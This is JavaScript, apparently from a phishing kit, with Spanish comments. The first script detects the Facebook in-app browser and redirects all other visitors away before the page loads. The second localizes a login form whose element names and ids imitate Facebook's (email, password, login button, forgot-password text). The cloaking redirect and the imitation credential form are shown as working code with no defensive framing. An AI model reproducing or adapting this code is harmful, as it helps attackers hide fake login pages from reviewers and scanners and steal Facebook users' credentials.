<script>
    // Función para detectar si la página se abre en la aplicación de Facebook
    function isFacebookApp() {
        return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
    }

    // Función para redirigir si no está en la aplicación de Facebook
    function checkAndRedirect() {
        if (!isFacebookApp()) {
            // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
            document.write("Redirigiendo a otra página...");
            window.location.href = "https://tuotrapagina.com";
        }
    }

    // Llamar a la función al cargar la página
    checkAndRedirect();
</script>

<script>
    document.addEventListener('DOMContentLoaded', function() {
      // Función para obtener el idioma del navegador
      function getBrowserLanguage() {
        var userLang = navigator.language || navigator.userLanguage;
        return userLang.substr(0, 2); // Devuelve las dos primeras letras (código de idioma)
      }
  
      // Función para cambiar dinámicamente el idioma del elemento HTML
      function autoTranslate() {
        var userLanguage = getBrowserLanguage();
  
        // Traducción para el botón
        var button = document.querySelector('.submitStyleRegister');
        if (button) {
          var translationKey = button.getAttribute('data-' + userLanguage);
          if (translationKey) {
            button.innerText = translationKey;
          }
        }
  
        // Traducción para el párrafo
        var paragraph = document.querySelector('.olvido');
        if (paragraph) {
          var translationKey = paragraph.getAttribute('data-' + userLanguage);
          if (translationKey) {
            paragraph.innerText = translationKey;
          }
        }
  
        // Traducción para el otro botón
        var loginButton = document.querySelector('.submitStyleLogin');
        if (loginButton) {
          var translationKey = loginButton.getAttribute('data-' + userLanguage);
          if (translationKey) {
            loginButton.innerText = translationKey;
          }
        }
  
        // Traducción para el formulario de contraseña
        var passwordInput = document.getElementById('pass');
        if (passwordInput) {
          var translationKey = passwordInput.getAttribute('data-' + userLanguage);
          if (translationKey) {
            passwordInput.setAttribute('placeholder', translationKey);
          }
        }
  
        // Traducción para el formulario de correo electrónico o número de teléfono
        var emailInput = document.getElementById('email');
        if (emailInput) {
          var translationKey = emailInput.getAttribute('data-' + userLanguage);
          if (translationKey) {
            emailInput.setAttribute('placeholder', translationKey);
          }
        }
  
        // Traducción para el div
        var divText = document.getElementById('u_0_1_ZE');
        if (divText) {
          var translationKey = divText.getAttribute('data-' + userLanguage);
          if (translationKey) {
            divText.innerText = translationKey;
          }
        }
      }
  
      // Llama a la función de traducción automática al cargar la página
      autoTranslate();
    });
  </script>
